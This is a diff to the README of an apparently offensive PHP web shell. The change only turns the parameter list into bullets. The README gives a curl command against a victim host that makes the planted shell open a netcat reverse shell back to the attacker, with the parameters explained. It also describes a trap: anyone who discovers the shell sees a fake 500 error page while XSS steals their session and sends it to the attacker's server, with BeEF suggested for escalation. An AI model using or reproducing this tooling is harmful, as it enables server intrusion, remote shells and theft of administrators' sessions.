@@ -19,10 +19,10 @@ Or to attempt to establish a reverse shell to your machine:
 
 `curl https://victim/slop.php --data "rcom=1&mthd=nc&rhost=&rport=&shell=sh`
 
-mthd = the method you want to use to establish the reverse shell, this is predefined in the `$comma` array, feel free to add to it, optional, if it is null, the script will choose for you.
-rhost = you, now this and the rport are not required, as it defaults to using netcat with the ip address in the `$_SERVER["REMOTE_ADDR"]` php env variable.
-rport = your listiner port, the default was set to 1634, just because.
-shell = the type of system shell you want to have. I know bash isnt standard on all systems, but thats why its nice for you to do some system recon before you try to execute this command.
+- mthd = the method you want to use to establish the reverse shell, this is predefined in the `$comma` array, feel free to add to it, optional, if it is null, the script will choose for you.
+- rhost = you, now this and the rport are not required, as it defaults to using netcat with the ip address in the `$_SERVER["REMOTE_ADDR"]` php env variable.
+- rport = your listiner port, the default was set to 1634, just because.
+- shell = the type of system shell you want to have. I know bash isnt standard on all systems, but thats why its nice for you to do some system recon before you try to execute this command.
 
 Here is the better part of this shell. If someone happens upon this shell, this shell will produce a 500 error with a fake error page then it will attempt some XSS to steal that users session information and sends it back to a handler script on your server/system. This will then attempt to store the information in a running log file. If it is unable to do so, well the backup is your logs. Once the XSS has completed, this shell will redirect the user back to the root(/) of the webserver. So, youll steal sessions if someone finds this, can even beef it up to execute commands on the server on behalf of the user, or drop a reverse shell on the users browser through Beef or another method. The possibilities are legit endless.
 
